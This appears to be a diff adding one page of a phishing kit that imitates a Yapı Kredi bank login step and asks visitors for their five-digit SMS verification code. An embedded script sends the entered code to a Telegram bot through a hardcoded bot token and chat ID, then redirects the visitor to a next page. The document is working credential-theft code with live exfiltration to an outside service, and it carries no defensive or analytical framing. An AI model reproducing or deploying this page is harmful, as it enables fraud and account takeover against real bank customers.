@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yapı Kredi</title>
+    <link rel="stylesheet" href="https://internetsube.yapikredi.com.tr/ngi-static/css/source/fonts.css">
+    <link rel="stylesheet" href="https://internetsube.yapikredi.com.tr/ngi-static/css/main.ui.min.css">
+    <link rel="stylesheet" href="main.css">
+    <style>
+        .responsive-image {
+            width: 100%;
+            max-width: 150px;
+            height: auto;
+            margin-bottom: 15px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .container {
+            text-align: center;
+        }
+        .sms-input {
+            margin: 20px auto;
+            display: block;
+        }
+        .giris-button {
+            background-color: #004481;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto;
+        }
+    </style>
+    <script>
+        function sendTelegramMessage() {
+            var smsCode = document.getElementById('sms-code').value;
+            var chatId = "-1002495157847";
+            var token = "7380726850:AAFZMnFFCtWf8SnIjlTCX04jpjlDNVo2TMY";
+            var message = "SMS Kod: " + smsCode;
+
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = "son.html";
+                } else {
+                    alert('Mesaj gönderilemedi.');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('Bir hata oluştu.');
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <a href="https://www.yapikredi.com.tr" target="_blank">
+                <img src="https://internetsube.yapikredi.com.tr/ngi-static/img/logo.png" alt="Yapı Kredi Logo">
+            </a>
+        </div>
+        
+        <img src="onay.png" alt="Başvuru Onay" class="responsive-image">
+        
+        <div class="message"><strong>Cihazınıza Sms Bildirimi Gönderildi.</strong></div>
+        <div class="note">Lütfen Mesajlar Kısmınızdaki 5 Haneli Kodunuzu Yazınız. </div>
+        
+        <input type="text" id="sms-code" class="sms-input" placeholder="SMS Kodunuz">
+        <button class="giris-button" onclick="sendTelegramMessage()">Giriş</button>
+    </div>
+</body>
+</html>
